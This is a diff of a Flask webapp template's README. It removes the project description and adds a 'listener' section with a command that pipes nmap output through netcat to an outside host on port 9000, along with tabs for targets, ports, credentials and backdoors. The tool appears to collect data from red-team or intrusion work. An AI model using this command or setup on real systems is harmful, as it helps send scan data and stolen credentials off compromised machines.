@@ -1,6 +1,3 @@
-# flask-bootstrap #
-
-Flask-Bootstrap is a simple template I use when creating small webapps using the Flask Framework, Twitter Bootstrap and SQLAlchemy as the ORM. 
 
 ## Install ##
 
@@ -23,3 +20,19 @@ project/views.py
 ## Run ##
 
     python runserver.py
+    
+## Listener ##
+
+    python redcloud.py
+    
+    
+## Commandline Syntax ##
+
+echo "secretkey/tabname" | cat - nmap.txt | nc netcat.us 9000
+
+## Current tabs accepted ##
+Target
+ports
+dir
+creds
+backdoors
